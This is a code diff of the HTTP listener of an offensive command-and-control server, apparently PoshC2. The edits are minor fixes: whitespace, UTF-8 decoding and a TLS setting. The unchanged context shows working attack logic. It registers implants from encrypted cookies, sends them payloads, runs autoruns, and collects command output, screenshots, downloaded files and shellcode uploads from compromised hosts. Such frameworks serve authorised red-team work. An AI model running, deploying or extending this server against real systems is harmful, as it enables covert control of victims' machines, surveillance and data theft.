@@ -2,15 +2,15 @@
 
 import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal
 
-from Implant import * 
+from Implant import *
 from Tasks import *
 from Core import *
 from Colours import *
-from Help import * 
+from Help import *
 from DB import *
 from Payloads import *
 from Config import *
-from Cert import * 
+from Cert import *
 from Help import *
 
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
@@ -126,12 +126,12 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           if s.path == ("%s?m" % new_implant_url):
             implant_type = "OSX"
 
-          if implant_type == "OSX":     
+          if implant_type == "OSX":
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             User,Domain,Hostname,Arch,PID,Proxy = decCookie.split(";")
-            newImplant = Implant(IPAddress, implant_type, Domain, User, Hostname, Arch, PID, Proxy)          
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.PythonCore)
@@ -140,13 +140,13 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             s.send_header("Content-type", "text/html")
             s.end_headers()
             s.wfile.write(responseVal)
-          else:   
-            try: 
+          else:
+            try:
               cookieVal = (s.cookieHeader).replace("SessionID=","")
               decCookie = decrypt(KEY, cookieVal)
               Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
               IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
-              newImplant = Implant(IPAddress, implant_type, Domain,User, Hostname, Arch, PID, Proxy)        
+              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
               newImplant.save()
               newImplant.display()
               newImplant.autoruns()
@@ -154,15 +154,15 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
               s.send_response(200)
               s.send_header("Content-type", "text/html")
-              s.end_headers()            
+              s.end_headers()
               s.wfile.write(responseVal)
             except Exception as e:
               print ("Decryption error: %s" % e)
               s.send_response(404)
               s.send_header("Content-type", "text/html")
-              s.end_headers()            
+              s.end_headers()
               s.wfile.write(HTTPResponse)
-        else: 
+        else:
           s.send_response(404)
           s.send_header("Content-type", "text/html")
           s.end_headers()
@@ -196,7 +196,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               print (Colours.GREEN)
               print ("Command returned against implant %s on host %s %s (%s)" % (implantID,Hostname,Domain,now.strftime("%m/%d/%Y %H:%M:%S")))
               #print decCookie,Colours.END
-              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:]) 
+              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
               outputParsed = outputParsed.rstrip()
 
@@ -205,7 +205,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 insert_completedtask(RandomURI, decCookie, "Module loaded sucessfully", "")
               if "get-screenshot" in decCookie.lower() or "screencapture" in decCookie.lower():
                 try:
-                  decoded = base64.b64decode(outputParsed) 
+                  decoded = base64.b64decode(outputParsed)
                   filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_"+randomuri())
                   output_file = open('%s%s.png' % (DownloadsDirectory,filename), 'wb')
                   print ("Screenshot captured: %s%s.png" % (DownloadsDirectory,filename))
@@ -213,7 +213,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                   output_file.write(decoded)
                   output_file.close()
                 except Exception as e:
-                  insert_completedtask(RandomURI, decCookie, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!", "")                  
+                  insert_completedtask(RandomURI, decCookie, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!", "")
                   print ("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
               elif (decCookie.lower().startswith("$shellcode64")) or (decCookie.lower().startswith("$shellcode64")):
                 insert_completedtask(RandomURI, decCookie, "Upload shellcode complete", "")
@@ -234,7 +234,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                   output_file.write(rawoutput[10:])
                   output_file.close()
                 except Exception as e:
-                  insert_completedtask(RandomURI, decCookie, "Error downloading file %s " % e, "")                                    
+                  insert_completedtask(RandomURI, decCookie, "Error downloading file %s " % e, "")
                   print ("Error downloading file %s " % e)
                 
               else:
@@ -280,7 +280,7 @@ if __name__ == '__main__':
       setupserver(HostnameIP,gen_key(),DomainFrontHeader,DefaultSleep,KillDate,HTTPResponse,ROOTDIR,ServerPort,QuickCommand,DownloadURI,"","","",Sounds,APIKEY,MobileNumber,URLS,SocksURLS,Insecure,UserAgent,Referer,APIToken,APIUser,EnableNotifications)
 
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
         C2[13], C2[11], "", "", C2[19], C2[20],
         C2[21], get_newimplanturl(), PayloadsDirectory)
 
@@ -308,7 +308,9 @@ if __name__ == '__main__':
     print (Colours.END)
 
     if (os.path.isfile("%sposh.crt" % ROOTDIR)) and (os.path.isfile("%sposh.key" % ROOTDIR)):
-      httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True)
+      httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
+      # add this if required - https://github.com/nettitude/PoshC2_Python/issues/13
+      # httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
     else:
       raise ValueError("Cannot find the certificate files")
     #logging.basicConfig(level=logging.WARNING) # DEBUG,INFO,WARNING,ERROR,CRITICAL
